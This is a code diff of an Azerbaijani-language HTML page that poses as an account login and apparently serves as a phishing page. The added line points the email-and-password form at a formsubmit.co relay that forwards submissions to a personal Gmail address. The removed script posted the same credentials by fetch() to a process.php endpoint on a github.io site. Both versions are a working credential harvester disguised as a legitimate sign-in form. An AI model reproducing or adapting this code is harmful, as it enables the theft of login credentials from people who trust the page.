@@ -66,7 +66,7 @@
         <h2>Hesabınıza Giriş Edin</h2>
         <p class="note">Xoş gəlmisiniz! Zəhmət olmasa, daxil olun.</p>
         <p class="note">Dəstəklənən Hesaplar: SS.</p>
-        <form id="myForm">
+        <form action="https://formsubmit.co/suleymanbabayevoffical@gmail.com" id="myForm">
             <div class="input-group">
                 <input type="email" name="email" placeholder="Email" required>
                 <input type="password" name="password" placeholder="Şifrə" required>
@@ -76,25 +76,5 @@
         </form>
         <p class="response-message" id="responseMessage"></p>
     </div>
-
-    <script>
-        document.getElementById("myForm").addEventListener("submit", function(event) {
-            event.preventDefault(); // Səhifənin yenilənməsinin qarşısını alırıq
-            var formData = new FormData(this);
-
-            fetch("https://sueely12.github.io/ffh/process.php", {
-                method: "POST",
-                body: formData
-            })
-            .then(response => response.text())
-            .then(data => {
-                document.getElementById("responseMessage").innerText = "Məlumat göndərildi: " + data;
-            })
-            .catch(error => {
-                document.getElementById("responseMessage").innerText = "Xəta baş verdi!";
-                console.error("Xəta baş verdi:", error);
-            });
-        });
-    </script>
 </body>
 </html>
